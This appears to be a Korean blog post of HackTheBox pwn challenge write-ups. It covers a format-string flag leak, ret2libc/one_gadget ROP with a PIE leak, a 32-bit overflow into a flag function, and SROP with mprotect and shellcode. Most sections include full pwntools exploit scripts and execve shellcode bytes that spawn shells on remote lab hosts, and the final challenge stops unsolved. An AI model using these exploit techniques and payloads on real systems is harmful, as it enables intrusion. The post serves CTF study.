---
layout: post
title:  "HackTheBox Pwn Study"
author: 5un9hun
categories: [ HackTheBox ]
tags: [ HTB, Pwn ]
image: assets/images/htb/pwn/title.png
description: "hackthebox pwn study"
hidden: false
---

pwn 분야는 내 주 분야이기도 해서 한 번 다 풀어볼 예정이다.

- [1. racecar - very easy (10pts)](#1-racecar---very-easy-10pts))
- [2. Space pirate: Retribution - very easy (10pts)](#2-space-pirate-retribution---very-easy-10pts)
- [3. You know 0xDiablos - easy (20pts)](#3-you-know-0xdiablos---easy-20pts)
- [4. Sick ROP - easy (30pts)](#4-sick-rop---easy-30pts)
- [5. Hunting - easy (30pts)](#5-hunting---easy-30pts)


## 1. racecar - very easy (10pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled.png)

바이너리 파일이 주어진다.

### 풀이 과정

바이너리가 주어지고, 32bits 로 컴파일된 파일이다. 보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn/Untitled%201.png)

소스 코드는 스킵.

먼저 프로그램의 간단한 기능은 다음과 같다.

1. Name 입력, Nickname 입력
2. 메뉴 출력 (1. Car info 2. Car selection)
3. 각각의 메뉴에 따라 함수 호출
4. Car info는 차량 2대의 스탯을 출력해준다.
5. Car selection은 2대의 차량 중 1개를 선택하여 경주를 하는 것이다. 이기면 flag를 출력시켜준다.

**취약점 탐색**

이제 취약한 포인트를 찾아야 한다.

다음은 flag를 읽어와서 특정 버퍼에 저장하는 로직이다. 

```c
void *buf; // [esp+18h] [ebp-40h]
FILE *stream; // [esp+1Ch] [ebp-3Ch]
char v13[44]; // [esp+20h] [ebp-38h] BYREF

...

if ( v9 == 1 && (result = v5, v5 < v7) || v9 == 2 && (result = v5, v5 > v7) )
  {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n", "\x1B[1;32m");
    coins += 100;
    printf("[+] Current coins: [%d]%s\n", coins, "\x1B[1;36m");
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s", "\x1B[0m");
    buf = malloc(0x171u);
    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m");
      exit(105);
    }
    fgets(v13, 44, stream);
    read(0, buf, 0x170u);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    result = printf((const char *)buf);
  }
```

처음의 if문 로직은 1번, 2번 선택을 통해 간단하게 진입할 수 있는데, 플래그를 v13 버퍼에 저장하고, 출력은 buf 버퍼로 한다.

buf 버퍼에 사용자의 입력 170개를 fgets 함수로 받기 때문에 Buffer Overflow 취약점이 발생하게 되지만, 보호기법 때문에 막힌다.

하지만 또 다른 취약점인 Format String Bug가 발생하여 flag를 leak이 가능하다.

v10 버퍼는 offset 12위치부터 시작한다. 따라서 거기서부터 leak을 하면된다.

**페이로드**

```python
from pwn import *
from binascii import *

#r = process('racecar')
r = remote('159.65.85.171', 30439)

r.sendlineafter(b'Name: ', b'5un9hun')
r.sendlineafter(b'Nickname: ', b'5un9hun')

r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'2')

payload = b''
payload += b'%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x'

r.sendlineafter(b'> ', payload)
r.recvuntil(b'this: \x1B[0m\n')

result = ''
flag = str(r.recv()[:-1])[2:-1].split(' ')
for i in flag:
	result += unhexlify(i).decode()[::-1]

print("FLAG : " + result)
r.close()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%202.png)

## 2. Space pirate: Retribution - very easy (10pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%203.png)

libc 파일과 바이너리 파일 등이 주어진다.

### 풀이 과정

제일 먼저 보호기법을 살펴보면 다음과 같다. canary가 없는 것을 보아하니 Buffer Overflow의 냄새가 난다.

![Untitled](/assets/images/htb/pwn/Untitled%204.png)

문제 기능을 살펴보면 다음과 같다.

1. 메뉴 출력후 1번 또는 2번에 대응하는 숫자 입력
2. 1번은 show_missiles 함수를 호출한다.
3. 2번은 missile_launcher함수를 호출한다.
4. show_missiles 함수는 2개의 미사일 stat을 출력시킨다.
5. missile_launcher 함수는 좌표값을 출력시키고, 새로운 좌표를 입력받고, 이후 한 번 더 입력을 받는다.

**취약점 탐색**

취약점은 missile_launcher 함수에서 발생한다. 새로운 좌표를 입력받고, 이후 한 번 더 입력을 받을 때 사이즈가 132이기 때문에 ret값을 조작할 수 있다.

```python
__int64 v1[4]; // [rsp+0h] [rbp-50h] BYREF
char buf[32]; // [rsp+20h] [rbp-30h] BYREF
__int64 v3; // [rsp+40h] [rbp-10h]
__int64 v4; // [rsp+48h] [rbp-8h]

...

read(0, v1, 132uLL);
```

프로그램 내에서 flag를 출력시키는 로직은 없기 때문에 ROP를 이용해서 직접 셸을 얻어야한다.

문제 파일에서는 libc 파일을 제공하기 때문에 libc_leak후에 one_gadget을 호출시키면 될 것 같다.

하지만 PIE 보호기법이 걸려있기 때문에 got 테이블의 주소나 다른 함수의 주소를 바로 이용할 수 없다. PIE base의 주소를 알아야하기 때문이다.

PIE base의 주소를 leak할 포인트를 찾다가 missile_launcher 코드를 보면 v1 버퍼는 널값으로 초기화를 시켜주지만, buf 버퍼는 초기화를 시키지 않고 바로 입력을 받는다. 

```c
int missile_launcher()
{
  __int64 v1[4]; // [rsp+0h] [rbp-50h] BYREF
  char buf[32]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v3; // [rsp+40h] [rbp-10h]
  __int64 v4; // [rsp+48h] [rbp-8h]

...

//v1 버퍼 초기화
  v1[0] = 0LL;
  v1[1] = 0LL;
  v1[2] = 0LL;
  v1[3] = 0LL;

//buf 버퍼는 초기화 안함
  read(0, buf, 0x1FuLL); // pie base leak
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf); // pie base leak

...
```

gdb로 해당 주소에 어떤 값이 들어있나 확인을 해보면 다음과 같다. 

![Untitled](/assets/images/htb/pwn/Untitled%205.png)

총 32바이트의 주소에 다음과 같은 값이 들어있다. 따라서 저 4개중 1개의 값을 leak하고 PIE Base간의 offset을 구해서 빼면 PIE Base 주소를 구할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%206.png)

나는 4개중 2번째에 있는 값을 leak할 것이고, 그 offset은 0xd70이다.

다음과 같이 PIE Base를 leak한 것을 알 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%207.png)

![Untitled](/assets/images/htb/pwn/Untitled%208.png)

이제 leak을 했으면 got 테이블이나 다른 함수들의 주소도 알 수 있기 때문에 이를 이용하여 exit_got 테이블을 printf 함수로 leak하여 Libc Base를 구할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%209.png)

이후 leak을 진행하고 missile_launcher 함수로 다시 돌아가 입력을 받고, 주어진 libc 파일을 이용해 one gadget 주소를 구한 후 ROP로 exploit 해주면 셸을 획득할 수 있다.

**페이로드**

```python
from pwn import *

r = remote('139.59.188.168', 32682)
#r = process('sp_retribution')

printf_plt_offset = 0x770
exit_got_offset = 0x202fc8
missile_launcher_offset = 0xa22
pr = 0xd33
ret = 0xaeb

exit_offset = 0x3a040

og = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

r.sendlineafter(b'>> ', b'2')
r.sendafter(b'y = ', b'A'*8)

#pie_base leak
r.recvuntil(b'A'*8)
leak = u64(r.recv(6) + b'\x00\x00')
pie_base = leak - 0xd70
printf_plt = pie_base + printf_plt_offset
exit_got = pie_base + exit_got_offset
missile_launcher = pie_base + missile_launcher_offset

log.info("PIE Base : " + hex(pie_base))

#libc_leak
payload = b''
payload += b'A'*0x50
payload += b'B'*8
payload += p64(pie_base + ret)
payload += p64(pie_base + pr)
payload += p64(exit_got)
payload += p64(printf_plt)
payload += p64(missile_launcher)

r.sendafter(b'(y/n): ', payload)

r.recvuntil(b'have been reset!\x1B[1;34m\n')
exit_addr = u64(r.recv(6) + b'\x00\x00')
libc_base = exit_addr - exit_offset

log.info("Libc Base : " + hex(libc_base))

#exploit
r.sendafter(b'y = ', b'A'*8)

payload = b''
payload += b'A'*0x50
payload += b'B'*8
payload += p64(libc_base + og[1])

#gdb.attach(r)

r.sendafter(b'(y/n): ', payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2010.png)

## 3. You know 0xDiablos - easy (20pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2011.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다. 벌써부터 굉장히 쉬워보인다.

![Untitled](/assets/images/htb/pwn/Untitled%2012.png)

대충 프로그램의 기능을 나열하면 다음과 같다.

1. vuln 함수 호출
2. vuln 함수에서 gets 함수를 통해 s 버퍼에 입력을 받음.
3. 입력받은 문자열을 puts 함수로 출력시킴.

엄청 간단한 프로그램이다.

**취약점 탐색**

프로그램이 간단하다보니 바로 취약점이 보인다. gets 함수를 사용해서 Buffer Overflow가 발생한다. 보호기법이 아무것도 걸려있지 않아서 바로 ROP를 이용해서 셸을 딸 수 있지만, 이 프로그램 내 정의된 사용자 정의 함수가 존재한다.

다음의 flag 함수가 있다.

```c
char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Hurry up and try in on server side.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == 0xDEADBEEF && a2 == 0xC0DED00D )
    result = (char *)printf(s);
  return result;
}
```

마지막 부분의 코드를 보면 첫번째 인자와 두번째 인자가 각각의 값에 대응될 때, flag를 출력시켜준다.

따라서 첫번째 인자로 0xDEADBEEF, 두번재 인자로 0xC0DED00D를 넣어주고 flag 함수를 호출하면 flag를 얻을 수 있다.

**페이로드**

```python
from pwn import *

r = remote('46.101.33.243',32587)

flag = 0x80491e2
ppr = 0x0804938a

payload = b''
payload += b'A'*0xB8
payload += b'B'*4
payload += p32(flag)
payload += p32(ppr)
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)

r.sendline(payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2013.png)

## 4. Sick ROP - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2014.png)

바이너리 파일이 주어진다.

### 풀이 과정

먼저 보호기법을 살펴보았다.

![Untitled](/assets/images/htb/pwn/Untitled%2015.png)

함수 목록을 살펴보면 다음 4개밖에 존재하지 않는다.

![Untitled](/assets/images/htb/pwn/Untitled%2016.png)

프로그램 기능을 나열하면 다음과 같다.

1. _start 함수에서 while문을 통해 vuln 함수를 무한 호출한다.
2. vuln 함수에서는 read 함수와 write 함수를 각각 호출한다.
3. read 함수의 인자로 버퍼와 0x300을 보내 함수 내부적으로 read(0, buf, 0x300)를 호출한다. write 함수도 비슷하게 호출된다.

**취약점 탐색**

취약점이라고 할 것도 없이 read 함수에서 300바이트의 입력을 받아서 Buffer Overflow가 발생한다. 

하지만 이를 이용해서 ROP를 진행하기에는 가젯이 별로 없다.

![Untitled](/assets/images/htb/pwn/Untitled%2017.png)

여기서는 SROP(Sigreturn-oriented-programming)를 이용해서 문제를 해결할 수 있다.

이 기법은 **sigreturn syscall**을 이용해서 레지스터값을 컨트롤 할 수 있는 기법이다.

- 필요 조건
    1. syscall 가젯 
    2. rax 컨트롤 가능 (syscall 호출 번호 용도)
- 작동 원리
    
    **정상적인 sigreturn system call**
    
    여러 가지 이유로 프로그램에 시그널이 발생할 때, 커널에서는 signal handler를 실행시켜주는데 이 때, kernel mode로 전환되어서 do_signal() -> handle_signal() 호출한다. 그리고 signal handler 의 등록 여부를 확인하고, 등록되어있으면 setup_frame() 으로 UserMode의 context가 저장되어 있는 UserModeStack을(레지스터) 조작하여 해당 signal 이 실행될 수 있게 하고, sigreturn system call이 발생한다. 그리고 끝나면 UserMode로 다시 변경되어 저장되어 있던 원래의 UserModeStack(레지스터)을 복구한다.
    
    ![Untitled](/assets/images/htb/pwn/Untitled%2018.png)
    
    **비정상적인 sigreturn system call**
    
    rop를 이용해 그냥 sigreturn() 을 호출해주면 호출시점의 rsp 기준으로 레지스터 프레임 구조체만큼 레지스터값들을 저장하기 때문에 변조할 수 있다.
    

이제 어떻게 exploit을 할까가 문제인데 생각한 방법은 다음과 같다.

1. bss영역에 “/bin/sh\x00” 문자열을 저장해놓고, execve(’/bin/sh’, NULL, NULL)을 호출한다.
2. mprotect 함수를 사용하면 특정 영역에 실행 권한을 부여할 수 있어서 쉘코드를 실행시킨다.

1번 같은 경우 syscall을 총 3번해야해서 더 짧게 할 수 있는 2번을 채택했다.

익스플로잇 방식은 다음과 같다.

- read 함수에서 overflow 발생 → vuln 함수의 ret 덮을 수 있음.
- ret에 vuln 함수를 다시 호출하고, vuln 함수가 끝나면 syscall 이 호출될 수 있도록 chain 구성
    
    (buffer + rbp + ret) → ret = vuln 주소(8) + syscall 가젯(8)
    
- 따라서 read, write의 리턴값이 입력한 값의 개수만큼 리턴(rax = return값)하기 때문에 이를 이용해서 rax에 syscall 번호를 맞추어주고, syscall 을 호출하면 해당하는 함수 호출(sigreturn)
- sigreturn 프레임에서 레지스터 조작 가능 → mprotect 함수 호출(0x400000~0x402000 rwx 부여)
- mprotect syscall 호출된 후, 다시 vuln 호출하게 하여 read 함수에서 쉘코드 저장 및 overflow로 vuln의 ret값을 버퍼의 주소로 저장
- vuln 함수가 끝나면 쉘코드가 들어있는 버퍼로 이동해서 쉘코드 실행

sigreturn 프레임 값에 저장된 mprotect 호출을 마치면 그 다음 실행할 주소를 rsp를 통해 가져온다. 다시 쉘코드를 입력해야하므로 vuln의 주소가 담긴 포인터를 찾아서 sigreturn 프레임의 rsp의 위치에 넣어줘야한다.

vuln 함수의 포인터값은 다음처럼 찾을 수 있었다.

![Untitled](/assets/images/htb/pwn/Untitled%2019.png)

이를 토대로 SigreturnFrame 클래스를 이용해서 페이로드를 구성했다.

```python
frame = SigreturnFrame()
frame.rax = 0xa	      # mprotect call
frame.rdi = 0x400000	# 0x400000
frame.rsi = 0x2000	  # 0x402000
frame.rdx = 0x7	      # 7 = rwx 
frame.rsp = vuln_p	  # not vuln addr, pointer
frame.rip = syscall	  # syscall gadget
```

이제 페이로드를 보내면, mprotect 함수가 호출되는데 vmmap 을 이용해서 영역 권한을 보면 mprotect 함수가 잘 호출된 것을 확인할 수 있다.

전)

![Untitled](/assets/images/htb/pwn/Untitled%2020.png)

후)

![Untitled](/assets/images/htb/pwn/Untitled%2021.png)

이제 쉘코드를 입력하기 위해 vuln함수로 돌아오게 구성했다. 그러면 다시 vuln 함수를 통해 read 함수가 호출되게 된다.

read 함수가 호출되면 read의 두번째인자인 버퍼의 주소에 값이 저장된다. 하지만 이 버퍼의 주소는 원래 주소가 아니라 rsp기준으로 + 8의 주소의 값에 저장하기 때문에 문제가 생긴다고 생각했다.

![Untitled](/assets/images/htb/pwn/Untitled%2022.png)

하지만 mprotect 함수로 0x400000~0x402000 까지 rwx 권한을 부여했기 때문에 rsp + 8 의 영역을 버퍼로 사용할 수 있었다. 

그렇기 때문에 0x4010b8 주소에 값에 쉘코드를 넣어주고, vuln의 ret 주소를 이 주소(0x4010b8)로 덮어주면 쉘코드가 실행되어 셸을 획득할 수 있다.

![Untitled](/assets/images/htb/pwn/Untitled%2023.png)

**페이로드**

```python
from pwn import *

#r = process('./sick_rop')
r = remote('139.59.188.168' ,32263)

#gdb.attach(r)

context.clear(arch='amd64')

syscall = 0x401014
vuln_addr = 0x40102e
vuln_p = 0x4010d8
buf = 0x4010b8
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

payload = b''
payload += b'A'*0x20
payload += b'B'*8
payload += p64(vuln_addr) # call read (2)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = 0xa	      # mprotect call
frame.rdi = 0x400000	# 0x400000
frame.rsi = 0x2000	  # 0x402000
frame.rdx = 0x7	      # 7 = rwx 
frame.rsp = vuln_p	  # not vuln addr, pointer / call read (3)
frame.rip = syscall	  # syscall gadget

payload += bytes(frame)

# first read
r.send(payload)
r.recv()

payload = b''
payload += b'A'*15 #sigreturn call

# second read
r.send(payload)
r.recv()

payload = b''
payload += shellcode
payload += b'\x90' * (40 - len(payload))
payload += p64(buf)

# final read
r.send(payload)
r.recv()

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn/Untitled%2024.png)

## 5. Hunting - easy (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn/Untitled%2025.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다. PIE 기법만 걸려있다.

![Untitled](/assets/images/htb/pwn/Untitled%2026.png)

이 문제는 디버깅 심볼이 없어서 더 까다로웠다.

### 플래그 획득